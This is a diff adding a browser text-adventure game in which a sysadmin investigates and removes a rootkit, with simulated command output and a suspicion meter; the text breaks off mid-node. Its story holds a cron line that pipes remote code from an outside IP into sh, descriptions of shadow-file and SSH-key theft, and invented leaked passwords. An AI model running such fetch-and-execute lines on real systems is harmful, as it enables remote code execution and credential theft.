@@ -1,0 +1,1708 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>sudo su - Root Access Hunt</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0a;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            line-height: 1.6;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* CRT scanline effect */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 255, 65, 0.03) 0px,
+                rgba(0, 0, 0, 0.2) 1px,
+                rgba(0, 0, 0, 0.2) 2px,
+                rgba(0, 255, 65, 0.03) 3px
+            );
+            pointer-events: none;
+            z-index: 1000;
+            animation: scanline 8s linear infinite;
+        }
+
+        @keyframes scanline {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(10px); }
+        }
+
+        /* CRT flicker effect */
+        @keyframes flicker {
+            0% { opacity: 1; }
+            2% { opacity: 0.92; }
+            4% { opacity: 1; }
+            8% { opacity: 0.95; }
+            10% { opacity: 1; }
+            100% { opacity: 1; }
+        }
+
+        body.flicker {
+            animation: flicker 0.3s ease-in-out;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .back-link {
+            color: #7c3aed;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 20px;
+            transition: opacity 0.2s;
+        }
+
+        .back-link:hover {
+            opacity: 0.7;
+        }
+
+        #terminal {
+            min-height: calc(100vh - 100px);
+            background: rgba(0, 0, 0, 0.3);
+            border: 2px solid #00ff41;
+            border-radius: 5px;
+            padding: 20px;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+        }
+
+        .ascii-art {
+            white-space: pre;
+            text-align: center;
+            margin: 20px 0;
+            font-size: 12px;
+            line-height: 1.2;
+        }
+
+        .output-line {
+            margin: 5px 0;
+        }
+
+        .prompt {
+            color: #00ff41;
+            margin-top: 15px;
+        }
+
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 18px;
+            background: #00ff41;
+            animation: blink 1s step-end infinite;
+            margin-left: 3px;
+        }
+
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+
+        .choices {
+            margin: 15px 0;
+            padding-left: 20px;
+        }
+
+        .choice {
+            margin: 8px 0;
+            cursor: pointer;
+            padding: 5px;
+            transition: all 0.2s;
+        }
+
+        .choice:hover {
+            background: rgba(0, 255, 65, 0.1);
+            padding-left: 15px;
+        }
+
+        .choice-number {
+            color: #7c3aed;
+            font-weight: bold;
+        }
+
+        .alert {
+            color: #ff4444;
+            font-weight: bold;
+        }
+
+        .warning {
+            color: #ffaa00;
+        }
+
+        .success {
+            color: #00ff41;
+            font-weight: bold;
+        }
+
+        .purple {
+            color: #7c3aed;
+        }
+
+        .status-bar {
+            position: fixed;
+            top: 0;
+            right: 0;
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid #00ff41;
+            padding: 10px 15px;
+            margin: 10px;
+            font-size: 14px;
+            z-index: 100;
+        }
+
+        .suspicion-meter {
+            margin-top: 5px;
+        }
+
+        .meter-bar {
+            width: 150px;
+            height: 10px;
+            border: 1px solid #00ff41;
+            display: inline-block;
+            margin-left: 10px;
+            position: relative;
+        }
+
+        .meter-fill {
+            height: 100%;
+            background: #00ff41;
+            transition: width 0.3s, background 0.3s;
+        }
+
+        .meter-fill.danger {
+            background: #ff4444;
+        }
+
+        .command-input {
+            background: transparent;
+            border: none;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            font-size: 16px;
+            outline: none;
+            width: calc(100% - 250px);
+            margin-left: 5px;
+        }
+
+        .timer {
+            color: #ff4444;
+            font-weight: bold;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a class="back-link" onclick="history.back()">← Back to Script House</a>
+
+        <div class="status-bar">
+            <div>STATUS: <span id="status-text" class="success">ACTIVE</span></div>
+            <div class="suspicion-meter">
+                SUSPICION:
+                <span class="meter-bar">
+                    <span id="meter-fill" class="meter-fill" style="width: 0%"></span>
+                </span>
+            </div>
+        </div>
+
+        <div id="terminal"></div>
+    </div>
+
+    <script>
+        // ===== AUDIO ENGINE =====
+        const AudioEngine = {
+            ctx: null,
+
+            init() {
+                this.ctx = new (window.AudioContext || window.webkitAudioContext)();
+            },
+
+            typewriterClick() {
+                if (!this.ctx) return;
+                const osc = this.ctx.createOscillator();
+                const gain = this.ctx.createGain();
+
+                osc.connect(gain);
+                gain.connect(this.ctx.destination);
+
+                osc.frequency.value = 800 + Math.random() * 200;
+                osc.type = 'square';
+
+                gain.gain.setValueAtTime(0.03, this.ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, this.ctx.currentTime + 0.02);
+
+                osc.start(this.ctx.currentTime);
+                osc.stop(this.ctx.currentTime + 0.02);
+            },
+
+            alertSting() {
+                if (!this.ctx) return;
+                const osc = this.ctx.createOscillator();
+                const gain = this.ctx.createGain();
+
+                osc.connect(gain);
+                gain.connect(this.ctx.destination);
+
+                osc.frequency.setValueAtTime(1200, this.ctx.currentTime);
+                osc.frequency.exponentialRampToValueAtTime(600, this.ctx.currentTime + 0.2);
+                osc.type = 'sawtooth';
+
+                gain.gain.setValueAtTime(0.1, this.ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, this.ctx.currentTime + 0.2);
+
+                osc.start(this.ctx.currentTime);
+                osc.stop(this.ctx.currentTime + 0.2);
+            },
+
+            successChime() {
+                if (!this.ctx) return;
+                const freqs = [523.25, 659.25, 783.99];
+                freqs.forEach((freq, i) => {
+                    const osc = this.ctx.createOscillator();
+                    const gain = this.ctx.createGain();
+
+                    osc.connect(gain);
+                    gain.connect(this.ctx.destination);
+
+                    osc.frequency.value = freq;
+                    osc.type = 'sine';
+
+                    const startTime = this.ctx.currentTime + (i * 0.1);
+                    gain.gain.setValueAtTime(0.08, startTime);
+                    gain.gain.exponentialRampToValueAtTime(0.01, startTime + 0.3);
+
+                    osc.start(startTime);
+                    osc.stop(startTime + 0.3);
+                });
+            },
+
+            glitchSound() {
+                if (!this.ctx) return;
+                const buffer = this.ctx.createBuffer(1, this.ctx.sampleRate * 0.3, this.ctx.sampleRate);
+                const data = buffer.getChannelData(0);
+
+                for (let i = 0; i < data.length; i++) {
+                    data[i] = Math.random() * 2 - 1;
+                }
+
+                const source = this.ctx.createBufferSource();
+                const gain = this.ctx.createGain();
+                const filter = this.ctx.createBiquadFilter();
+
+                source.buffer = buffer;
+                source.connect(filter);
+                filter.connect(gain);
+                gain.connect(this.ctx.destination);
+
+                filter.type = 'highpass';
+                filter.frequency.value = 2000;
+
+                gain.gain.setValueAtTime(0.05, this.ctx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, this.ctx.currentTime + 0.3);
+
+                source.start(this.ctx.currentTime);
+            },
+
+            heartbeat() {
+                if (!this.ctx) return;
+                for (let i = 0; i < 2; i++) {
+                    const osc = this.ctx.createOscillator();
+                    const gain = this.ctx.createGain();
+
+                    osc.connect(gain);
+                    gain.connect(this.ctx.destination);
+
+                    osc.frequency.value = 80;
+                    osc.type = 'sine';
+
+                    const startTime = this.ctx.currentTime + (i * 0.15);
+                    gain.gain.setValueAtTime(0.2, startTime);
+                    gain.gain.exponentialRampToValueAtTime(0.01, startTime + 0.1);
+
+                    osc.start(startTime);
+                    osc.stop(startTime + 0.1);
+                }
+            }
+        };
+
+        // ===== GAME STATE =====
+        const GameState = {
+            suspicion: 0,
+            maxSuspicion: 100,
+            currentNode: 'intro',
+            visitedNodes: [],
+            choices: {},
+            timerInterval: null,
+            gameEnded: false
+        };
+
+        // ===== STORY NODES =====
+        const StoryNodes = {
+            intro: {
+                text: `
+<div class="ascii-art">
+ _____ _   _ ____   ___    _____ _   _
+/ ____| | | |  _ \\ / _ \\  / ____| | | |
+| (___ | | | | | | | | | | (___ | | | |
+ \\___ \\| | | | | | | | | |\\___ \\| | | |
+ ____) | |_| | |_| | |_| |____) | |_| |
+|_____/ \\___/|____/ \\___/|_____/ \\___/
+
+      ROOT ACCESS HUNT v1.0
+    SECURE LINUX SYSTEM ANALYSIS
+</div>
+
+[SYSTEM BOOT] Initializing terminal session...
+[OK] User authentication: root@compromised
+[OK] Loading system modules...
+
+=====================================
+
+You are the senior sysadmin for HexCorp's production server farm.
+
+2:47 AM - Your phone vibrates. Automated alert:
+
+<span class="alert">ANOMALY DETECTED: Unusual outbound traffic on prod-server-03</span>
+<span class="warning">SOURCE: /tmp/...systemd-cache (suspicious process)</span>
+
+You SSH into the server. Your terminal prompt blinks ominously.
+
+The night shift is quiet. Too quiet.
+
+What do you do first?`,
+                choices: [
+                    { text: 'ps aux | grep systemd-cache', next: 'check_process', suspicion: 0 },
+                    { text: 'rm -rf /tmp/* (delete everything in /tmp)', next: 'bad_move_1', suspicion: 40 },
+                    { text: 'netstat -tulpn (check network connections)', next: 'check_network', suspicion: 5 },
+                    { text: 'poweroff (shut down the server immediately)', next: 'bad_move_2', suspicion: 30 }
+                ]
+            },
+
+            check_process: {
+                text: `
+<span class="prompt">root@compromised:~#</span> ps aux | grep systemd-cache
+
+Processing...
+
+<span class="warning">root     17384  0.8  2.1  94816 43704 ?    Ss   02:31   0:12 /tmp/...systemd-cache --daemon</span>
+root     17385  0.1  0.3  12384  6912 ?    S    02:31   0:02 /tmp/...systemd-cache --worker
+root     17392  0.0  0.1   8192  2048 pts/0 S+  02:47   0:00 grep systemd-cache
+
+<span class="alert">[!] ANALYSIS:</span>
+- Process running from /tmp (red flag)
+- Hidden directory name "...systemd-cache" (mimics legit service)
+- Running as root (privilege escalation confirmed)
+- Started at 02:31 (24 minutes ago)
+
+The process has spawned worker threads. This is active.`,
+                choices: [
+                    { text: 'kill -9 17384 (terminate the process immediately)', next: 'kill_process', suspicion: 35 },
+                    { text: 'ls -la /tmp/...systemd-cache/ (examine the binary)', next: 'examine_binary', suspicion: 5 },
+                    { text: 'strace -p 17384 (trace system calls)', next: 'strace_analysis', suspicion: 10 },
+                    { text: 'lsof -p 17384 (list open files)', next: 'lsof_check', suspicion: 5 }
+                ]
+            },
+
+            check_network: {
+                text: `
+<span class="prompt">root@compromised:~#</span> netstat -tulpn
+
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1234/sshd
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      2456/nginx
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      2456/nginx
+<span class="alert">tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      17384/...systemd-ca</span>
+<span class="warning">tcp        1      0 10.0.1.47:54328         45.33.32.156:443        ESTABLISHED 17384/...systemd-ca</span>
+
+<span class="alert">[!] CRITICAL FINDINGS:</span>
+1. Port 4444 listening (common backdoor port)
+2. Active connection to 45.33.32.156:443
+3. Process name truncated: "...systemd-ca"
+
+The attacker has established a command & control channel.
+
+You need to act carefully. The connection is LIVE.`,
+                choices: [
+                    { text: 'Check the process with ps aux', next: 'check_process', suspicion: 0 },
+                    { text: 'iptables -A OUTPUT -d 45.33.32.156 -j DROP (block C2)', next: 'block_c2', suspicion: 15 },
+                    { text: 'tcpdump -i eth0 host 45.33.32.156 (capture traffic)', next: 'tcpdump', suspicion: 10 },
+                    { text: 'shutdown -h now (emergency shutdown)', next: 'bad_move_2', suspicion: 30 }
+                ]
+            },
+
+            examine_binary: {
+                text: `
+<span class="prompt">root@compromised:~#</span> ls -la /tmp/...systemd-cache/
+
+total 348
+drwxr-xr-x  2 root root   4096 Jan 15 02:31 .
+drwxrwxrwt 24 root root  12288 Jan 15 02:47 ..
+-rwxr-xr-x  1 root root 287456 Jan 15 02:30 systemd-cache
+-rw-r--r--  1 root root  45312 Jan 15 02:31 .keylog
+-rw-r--r--  1 root root   8192 Jan 15 02:46 .exfil
+
+<span class="prompt">root@compromised:~#</span> file systemd-cache
+
+systemd-cache: ELF 64-bit LSB executable, x86-64, dynamically linked, stripped
+
+<span class="warning">[!] DISCOVERED:</span>
+- .keylog (likely capturing keystrokes)
+- .exfil (data exfiltration staging)
+- Binary is stripped (anti-forensics)
+
+<span class="prompt">root@compromised:~#</span> head -c 100 .exfil
+
+/etc/shadow
+root:$6$randomsalt$hashdata...
+daemon:*:18397:0:99999:7:::
+<span class="alert">admin:$6$salthash$credentials...</span>
+
+<span class="alert">CRITICAL: Password hashes are being exfiltrated!</span>`,
+                choices: [
+                    { text: 'cat .keylog (check keystroke captures)', next: 'check_keylog', suspicion: 5 },
+                    { text: 'md5sum systemd-cache (get hash for analysis)', next: 'hash_analysis', suspicion: 0 },
+                    { text: 'rm -rf /tmp/...systemd-cache/ (delete everything)', next: 'delete_evidence', suspicion: 50 },
+                    { text: 'crontab -l (check for persistence)', next: 'check_cron', suspicion: 5 }
+                ]
+            },
+
+            lsof_check: {
+                text: `
+<span class="prompt">root@compromised:~#</span> lsof -p 17384
+
+COMMAND     PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+...system 17384 root  cwd    DIR    8,1     4096  524 /tmp/...systemd-cache
+...system 17384 root  rtd    DIR    8,1     4096    2 /
+...system 17384 root  txt    REG    8,1   287456  843 /tmp/...systemd-cache/systemd-cache
+<span class="warning">...system 17384 root    3u  IPv4  98765      0t0  TCP *:4444 (LISTEN)</span>
+<span class="warning">...system 17384 root    4u  IPv4  98766      0t0  TCP 10.0.1.47:54328->45.33.32.156:443 (ESTABLISHED)</span>
+<span class="alert">...system 17384 root    5w   REG    8,1    45312  921 /tmp/...systemd-cache/.keylog</span>
+<span class="alert">...system 17384 root    6w   REG    8,1     8192  922 /tmp/...systemd-cache/.exfil</span>
+...system 17384 root    7r   REG    8,1        0  445 /etc/shadow
+
+<span class="alert">[!] ACTIVE FILE OPERATIONS:</span>
+- Writing to .keylog (keystroke logging)
+- Writing to .exfil (data staging)
+- Reading /etc/shadow (password theft)
+- Network connection to 45.33.32.156
+
+Time is running out. Data is actively being stolen.`,
+                choices: [
+                    { text: 'Check what\'s in those log files', next: 'examine_binary', suspicion: 0 },
+                    { text: 'Block the C2 connection with iptables', next: 'block_c2', suspicion: 15 },
+                    { text: 'Trace system calls with strace', next: 'strace_analysis', suspicion: 10 },
+                    { text: 'Kill the process immediately', next: 'kill_process', suspicion: 35 }
+                ]
+            },
+
+            strace_analysis: {
+                text: `
+<span class="prompt">root@compromised:~#</span> strace -p 17384 2>&1 | head -20
+
+Process 17384 attached
+<span class="warning">open("/etc/shadow", O_RDONLY)         = 7</span>
+read(7, "root:$6$...", 4096)            = 2847
+write(6, "root:$6$...", 2847)           = 2847
+<span class="alert">sendto(4, "\\x17\\x03\\x03\\x00\\x1c...", 33, 0, NULL, 0) = 33</span>
+recvfrom(4, "\\x17\\x03\\x03\\x00\\x31...", 5, 0, NULL, NULL) = 5
+<span class="warning">open("/home/admin/.ssh/id_rsa", O_RDONLY) = 8</span>
+read(8, "-----BEGIN OPENSSH PRIVATE KEY---", 2048) = 2048
+write(6, "-----BEGIN OPENSSH...", 2048)  = 2048
+sendto(4, "\\x17\\x03\\x03\\x08\\x00...", 2053, 0, NULL, 0) = 2053
+<span class="alert">recvfrom(4, "\\x17\\x03\\x03\\x00\\x15...", 5, 0, NULL, NULL) = 5</span>
+
+<span class="alert">REAL-TIME ANALYSIS:</span>
+The attacker is:
+1. Reading /etc/shadow (password hashes)
+2. Stealing SSH private keys
+3. Sending encrypted data over the network (TLS)
+4. Receiving acknowledgments from C2 server
+
+<span class="purple">SUSPICION INCREASED: The longer you watch, the more data leaks...</span>`,
+                choices: [
+                    { text: 'I\'ve seen enough. Kill the process now.', next: 'kill_process', suspicion: 35 },
+                    { text: 'Block the C2 connection immediately', next: 'block_c2', suspicion: 15 },
+                    { text: 'Check crontab for persistence mechanisms', next: 'check_cron', suspicion: 10 },
+                    { text: 'Continue monitoring to gather more intel', next: 'continue_monitoring', suspicion: 25 }
+                ]
+            },
+
+            check_cron: {
+                text: `
+<span class="prompt">root@compromised:~#</span> crontab -l
+
+# System maintenance tasks
+0 2 * * * /usr/local/bin/system-update.sh
+<span class="alert">*/5 * * * * /tmp/...systemd-cache/systemd-cache --daemon >/dev/null 2>&1</span>
+0 0 * * 0 /usr/bin/cleanup-logs.sh
+
+<span class="prompt">root@compromised:~#</span> crontab -l -u www-data
+
+<span class="alert">@reboot /tmp/...systemd-cache/systemd-cache --daemon >/dev/null 2>&1</span>
+<span class="warning">*/10 * * * * curl -s http://45.33.32.156/beacon | sh</span>
+
+<span class="alert">[!] PERSISTENCE DISCOVERED:</span>
+- Rootkit respawns every 5 minutes via root cron
+- Respawns on boot via www-data cron
+- Remote code execution via curl pipe to shell
+- Multiple accounts compromised
+
+The attacker has deep hooks in your system.
+
+This is sophisticated. They've planned for discovery.`,
+                choices: [
+                    { text: 'crontab -r (remove all cron jobs)', next: 'remove_cron', suspicion: 10 },
+                    { text: 'Check /var/log/auth.log for intrusion vector', next: 'check_logs', suspicion: 5 },
+                    { text: 'Block C2 and kill process together', next: 'coordinated_action', suspicion: 20 },
+                    { text: 'grep -r "45.33.32.156" /etc/ (find more references)', next: 'grep_ip', suspicion: 5 }
+                ]
+            },
+
+            check_keylog: {
+                text: `
+<span class="prompt">root@compromised:~#</span> cat /tmp/...systemd-cache/.keylog | tail -50
+
+[2026-01-15 02:32:14] TTY: /dev/pts/0 USER: admin
+sudo su
+[sudo] password for admin: <span class="alert">Adm1n_P@ssw0rd_2024</span>
+
+[2026-01-15 02:33:45] TTY: /dev/pts/0 USER: root
+mysql -u root -p
+Enter password: <span class="alert">MySql_R00t_S3cr3t!</span>
+
+[2026-01-15 02:38:22] TTY: /dev/pts/0 USER: root
+ssh deploy@backup-server
+deploy@backup-server's password: <span class="alert">D3pl0y_B@ckup_K3y</span>
+
+[2026-01-15 02:41:03] TTY: /dev/pts/1 USER: dbadmin
+psql -U postgres
+Password for user postgres: <span class="alert">P0stgr3s_Pr0d_Pwd</span>
+
+<span class="alert">[!] CATASTROPHIC BREACH:</span>
+- Multiple user credentials captured
+- Database passwords compromised
+- Backup server access stolen
+- 24 minutes of keystroke logging
+
+Your hands shake as you realize the scope.
+
+Every command typed in the last 24 minutes is here.`,
+                choices: [
+                    { text: 'passwd (change root password immediately)', next: 'change_passwords', suspicion: 15 },
+                    { text: 'Check auth logs for how they got in', next: 'check_logs', suspicion: 5 },
+                    { text: 'Kill process and block C2 now', next: 'coordinated_action', suspicion: 20 },
+                    { text: 'Copy evidence before taking action', next: 'copy_evidence', suspicion: 10 }
+                ]
+            },
+
+            check_logs: {
+                text: `
+<span class="prompt">root@compromised:~#</span> grep -i "failed\\|accepted" /var/log/auth.log | tail -30
+
+Jan 15 01:47:32 prod-03 sshd[15234]: Failed password for admin from 203.0.113.45 port 54123 ssh2
+Jan 15 01:47:35 prod-03 sshd[15234]: Failed password for admin from 203.0.113.45 port 54123 ssh2
+Jan 15 01:47:38 prod-03 sshd[15234]: Failed password for admin from 203.0.113.45 port 54123 ssh2
+Jan 15 01:52:14 prod-03 sshd[15891]: <span class="warning">Accepted publickey for www-data from 203.0.113.45 port 54892 ssh2: RSA SHA256:Xj8k...</span>
+Jan 15 01:53:02 prod-03 sudo: <span class="alert">www-data : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash</span>
+Jan 15 02:30:47 prod-03 CRON[17380]: (root) CMD (/tmp/...systemd-cache/systemd-cache --daemon)
+
+<span class="prompt">root@compromised:~#</span> ls -la /var/www/.ssh/
+
+total 16
+drwx------ 2 www-data www-data 4096 Dec 28 14:23 .
+drwxr-xr-x 8 www-data www-data 4096 Jan 15 01:52 ..
+<span class="alert">-rw------- 1 www-data www-data 1876 Dec 28 14:23 authorized_keys</span>
+
+<span class="alert">[!] INTRUSION VECTOR IDENTIFIED:</span>
+1. Attacker brute-forced SSH (failed attempts)
+2. Compromised www-data account via stolen SSH key
+3. Privilege escalation to root via sudo misconfiguration
+4. Deployed rootkit and established persistence
+
+They got in through a web server compromise three weeks ago.`,
+                choices: [
+                    { text: 'cat /var/www/.ssh/authorized_keys (check the key)', next: 'check_authorized_keys', suspicion: 0 },
+                    { text: 'Disable www-data sudo access immediately', next: 'fix_sudo', suspicion: 10 },
+                    { text: 'Time to end this. Coordinated attack response.', next: 'coordinated_action', suspicion: 20 },
+                    { text: 'whois 45.33.32.156 (identify attacker)', next: 'whois_check', suspicion: 5 }
+                ]
+            },
+
+            block_c2: {
+                text: `
+<span class="prompt">root@compromised:~#</span> iptables -A OUTPUT -d 45.33.32.156 -j DROP
+<span class="prompt">root@compromised:~#</span> iptables -A INPUT -s 45.33.32.156 -j DROP
+
+<span class="success">[OK] C2 connection blocked</span>
+
+<span class="prompt">root@compromised:~#</span> netstat -tulpn | grep 17384
+
+tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      17384/...systemd-ca
+tcp        1      0 10.0.1.47:54328         45.33.32.156:443        <span class="warning">SYN_SENT    17384/...systemd-ca</span>
+
+The connection is severed. The process is retrying...
+
+<span class="alert">[ALERT] Process detected network failure</span>
+<span class="warning">[WARNING] Rootkit entering defensive mode</span>
+
+You see the process behavior change in real-time.
+The attacker knows something is wrong.
+
+<span class="purple">SUSPICION INCREASED</span>
+
+What now?`,
+                choices: [
+                    { text: 'Kill the process before it reacts further', next: 'kill_process_alerted', suspicion: 20 },
+                    { text: 'Check cron jobs before they respawn', next: 'check_cron', suspicion: 5 },
+                    { text: 'Copy evidence while they\'re blind', next: 'copy_evidence', suspicion: 5 },
+                    { text: 'Monitor the process behavior', next: 'monitor_defensive', suspicion: 15 }
+                ]
+            },
+
+            kill_process: {
+                text: `
+<span class="prompt">root@compromised:~#</span> kill -9 17384 17385
+
+<span class="alert">[ALERT] The attacker's connection suddenly drops</span>
+
+On their screen, miles away:
+> Connection to prod-03 lost: Connection reset by peer
+> Attempting reconnect...
+> <span class="alert">FAILED</span>
+
+<span class="prompt">root@compromised:~#</span> ps aux | grep systemd-cache
+
+root     17392  0.0  0.1   8192  2048 pts/0 S+  03:15   0:00 grep systemd-cache
+
+Process terminated.
+
+<span class="warning">But wait...</span>
+
+<span class="prompt">root@compromised:~#</span> sleep 300 && ps aux | grep systemd-cache
+
+[5 minutes later]
+
+<span class="alert">root     18472  0.8  2.1  94816 43704 ?    Ss   03:20   0:01 /tmp/...systemd-cache --daemon</span>
+
+<span class="alert">IT RESPAWNED.</span>
+
+Cron job kicked in. The rootkit is back.
+
+You killed the process, but not the infection.`,
+                choices: [
+                    { text: 'Check cron jobs immediately', next: 'check_cron', suspicion: 5 },
+                    { text: 'Delete the binary from /tmp', next: 'delete_binary', suspicion: 20 },
+                    { text: 'Block C2 to prevent reconnection', next: 'block_c2', suspicion: 10 },
+                    { text: 'Start comprehensive cleanup', next: 'coordinated_action', suspicion: 15 }
+                ]
+            },
+
+            kill_process_alerted: {
+                text: `
+<span class="prompt">root@compromised:~#</span> kill -9 17384 17385
+
+Process terminated.
+
+But you were too slow.
+
+<span class="prompt">root@compromised:~#</span> ls -la /tmp/...systemd-cache/
+
+ls: cannot access '/tmp/...systemd-cache/': No such file or directory
+
+<span class="alert">[!] EVIDENCE DESTROYED</span>
+
+In the brief moment before you killed it, the process:
+- Detected the iptables block
+- Triggered self-destruct protocol
+- Wiped .keylog and .exfil
+- Removed the binary
+- Cleared bash history
+
+<span class="prompt">root@compromised:~#</span> history | tail -5
+
+(empty)
+
+<span class="alert">They covered their tracks.</span>
+
+You stopped the immediate threat, but lost critical evidence.
+No way to trace them. No way to know what they took.
+
+The attacker is gone, but so is your forensic trail.`,
+                choices: [
+                    { text: 'Check system logs for any remaining clues', next: 'ending_contained', suspicion: 0 },
+                    { text: 'Accept the loss and secure the system', next: 'ending_contained', suspicion: 0 }
+                ]
+            },
+
+            coordinated_action: {
+                text: `
+<span class="purple">You take a deep breath. Time for the endgame.</span>
+
+<span class="prompt">root@compromised:~#</span> # Coordinated response initiated
+
+<span class="success">STEP 1: Copy evidence</span>
+<span class="prompt">root@compromised:~#</span> tar czf /root/evidence-$(date +%s).tar.gz /tmp/...systemd-cache/ /var/log/auth.log
+
+evidence-1737774234.tar.gz created
+
+<span class="success">STEP 2: Block C2 communications</span>
+<span class="prompt">root@compromised:~#</span> iptables -A OUTPUT -d 45.33.32.156 -j DROP
+<span class="prompt">root@compromised:~#</span> iptables -A INPUT -s 45.33.32.156 -j DROP
+
+C2 blocked.
+
+<span class="success">STEP 3: Kill malicious processes</span>
+<span class="prompt">root@compromised:~#</span> kill -9 17384 17385
+
+Processes terminated.
+
+<span class="success">STEP 4: Remove persistence</span>
+<span class="prompt">root@compromised:~#</span> crontab -r
+<span class="prompt">root@compromised:~#</span> crontab -r -u www-data
+
+Cron jobs removed.
+
+<span class="success">STEP 5: Clean infection</span>
+<span class="prompt">root@compromised:~#</span> rm -rf /tmp/...systemd-cache/
+
+Binary deleted.
+
+<span class="prompt">root@compromised:~#</span> ps aux | grep systemd-cache
+
+root     18901  0.0  0.1   8192  2048 pts/0 S+  03:25   0:00 grep systemd-cache
+
+<span class="success">Clean.</span>
+
+You wait. One minute. Five minutes. Ten minutes.
+
+No respawn. No reconnection.
+
+<span class="success">The threat is neutralized.</span>
+
+Now for the hard part: damage assessment.`,
+                choices: [
+                    { text: 'Generate forensic report', next: 'ending_victory', suspicion: 0 },
+                    { text: 'Document the incident', next: 'ending_victory', suspicion: 0 }
+                ]
+            },
+
+            copy_evidence: {
+                text: `
+<span class="prompt">root@compromised:~#</span> mkdir -p /root/incident-evidence
+<span class="prompt">root@compromised:~#</span> cp -r /tmp/...systemd-cache/ /root/incident-evidence/
+<span class="prompt">root@compromised:~#</span> cp /var/log/auth.log /root/incident-evidence/
+<span class="prompt">root@compromised:~#</span> crontab -l > /root/incident-evidence/root-crontab.txt
+<span class="prompt">root@compromised:~#</span> netstat -tulpn > /root/incident-evidence/netstat.txt
+
+<span class="success">[OK] Evidence preserved</span>
+
+You've secured copies of:
+- The rootkit binary
+- Keystroke logs
+- Exfiltrated data staging
+- Network connections
+- Cron persistence mechanisms
+- System logs
+
+This evidence will be crucial for:
+- Forensic analysis
+- Legal prosecution
+- Security audits
+- Incident reports
+
+<span class="purple">GOOD MOVE: Evidence preservation is critical</span>
+
+Now you can act decisively without losing the trail.`,
+                choices: [
+                    { text: 'Execute coordinated cleanup', next: 'coordinated_action', suspicion: 0 },
+                    { text: 'Analyze the binary further first', next: 'hash_analysis', suspicion: 0 },
+                    { text: 'Check who the attacker is', next: 'whois_check', suspicion: 0 }
+                ]
+            },
+
+            whois_check: {
+                text: `
+<span class="prompt">root@compromised:~#</span> whois 45.33.32.156
+
+NetRange:       45.33.0.0 - 45.33.255.255
+CIDR:           45.33.0.0/16
+NetName:        LINODE-US
+Organization:   Linode, LLC
+Country:        US
+Address:        Philadelphia, PA
+
+<span class="prompt">root@compromised:~#</span> curl -s https://ipinfo.io/45.33.32.156
+
+{
+  "ip": "45.33.32.156",
+  "hostname": "vps-87432.linode.com",
+  "city": "Philadelphia",
+  "region": "Pennsylvania",
+  "country": "US",
+  "org": "AS63949 Linode, LLC"
+}
+
+<span class="warning">[ANALYSIS]</span>
+- VPS hosting (easily disposable)
+- Philadelphia datacenter (likely compromised VPS)
+- Linode infrastructure (legitimate hosting, abused)
+
+This is a proxy/pivot point, not the real attacker.
+The true origin is hidden behind this compromised VPS.
+
+Professional operation. They're covering tracks.
+
+<span class="prompt">root@compromised:~#</span> strings /tmp/...systemd-cache/systemd-cache | grep -E '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}'
+
+45.33.32.156
+<span class="alert">198.51.100.78</span>
+
+<span class="purple">A BACKUP C2 ADDRESS!</span>
+
+They have failover infrastructure.`,
+                choices: [
+                    { text: 'Block both IP addresses', next: 'block_both_ips', suspicion: 10 },
+                    { text: 'Time for coordinated response', next: 'coordinated_action', suspicion: 0 },
+                    { text: 'Investigate the second IP', next: 'investigate_backup_c2', suspicion: 5 }
+                ]
+            },
+
+            hash_analysis: {
+                text: `
+<span class="prompt">root@compromised:~#</span> md5sum /tmp/...systemd-cache/systemd-cache
+
+7c9f8d1e3b5a2f6c4e8a0d9b7c6e5f4a  systemd-cache
+
+<span class="prompt">root@compromised:~#</span> sha256sum /tmp/...systemd-cache/systemd-cache
+
+3f8a2c7e9d6b1f5a4c8e0d2b7f9a6c3e1d5b8f2a7c9e4d6b0f3a8c5e7d9b1f4a2c  systemd-cache
+
+<span class="prompt">root@compromised:~#</span> curl -s "https://www.virustotal.com/api/v3/search?query=3f8a2c7e9d6b1f5a4c8e0d2b7f9a6c3e1d5b8f2a7c9e4d6b0f3a8c5e7d9b1f4a2c"
+
+<span class="alert">[VT API Response]</span>
+<span class="warning">61/72 security vendors flagged this file as malicious</span>
+
+Detection names:
+- Kaspersky: Backdoor.Linux.Agent.az
+- Sophos: Linux/Rootkit-BG
+- ESET-NOD32: Linux/Agent.DT
+- CrowdStrike: malicious_confidence_100%
+
+<span class="alert">KNOWN THREAT:</span>
+Family: "ShadowRoot" APT toolkit
+First seen: 2024-11-23
+Associated with: APT-C-78 (suspected nation-state)
+Capabilities:
+  - SSH credential harvesting
